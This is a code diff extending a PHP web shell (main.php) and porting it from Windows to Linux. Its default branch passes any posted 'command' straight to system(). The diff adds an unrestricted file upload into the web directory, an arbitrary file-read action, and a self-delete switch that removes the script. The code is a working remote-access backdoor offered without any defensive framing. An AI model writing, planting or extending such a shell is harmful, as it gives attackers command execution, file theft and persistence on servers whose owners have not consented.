@@ -13,17 +13,29 @@
 
 <form action="main.php" method="post" style="display: contents;">
 	<input type="hidden" name="command" value="02"/>
-	<button type="submit">ipconfig</button>
+	<button type="submit">ifconfig</button>
 </form>
 
 <form action="main.php" method="post" style="display: contents;">
 	<input type="hidden" name="command" value="03"/>
-	<button type="submit">route print</button>
+	<button type="submit">ip route</button>
 </form>
 
 <form action="main.php" method="post" style="display: contents;">
 	<input type="hidden" name="command" value="04"/>
 	<button type="submit">list file</button>
+</form>
+
+<form action="main.php" method="post" style="display: contents;" enctype="multipart/form-data">
+	<input type="hidden" name="command" value="05"/>
+	<input type="file" name="userfile"></input>
+	<button type="submit">upload</button>
+</form>
+
+<form action="main.php" method="post" style="display: contents;">
+	<input type="hidden" name="command" value="06"/>
+	<input type="text" name="thefile"></input>
+	<button type="submit">view file</button>
 </form>
 
 <br>
@@ -56,21 +68,35 @@
 			system("dir");
 			break;
 		case "02":
-			system("ipconfig /all");
+			system("ifconfig");
 			break;
 		case "03":
-			system("route print");
+			system("ip route");
 			break;
 		case "04":
 			listfile();
 			break;
+		case "05":
+			$uploaddir = './';
+			$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
+			if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
+				echo "file upload successful\n";
+			} else {
+				echo "file upload failed!\n";
+			}
+			break;
+		case "06":
+			$output = file_get_contents($_POST['thefile']);
+			echo htmlspecialchars($output, ENT_QUOTES);
 		default:
+			echo $_POST['command'];
+			echo "<br>";
 			system($_POST['command']);
 			break;
 	}
 	
 	if ($_POST['destroy']) {
-		system("del main.php");
+		system("rm main.php");
 		die();
 	}
 ?>
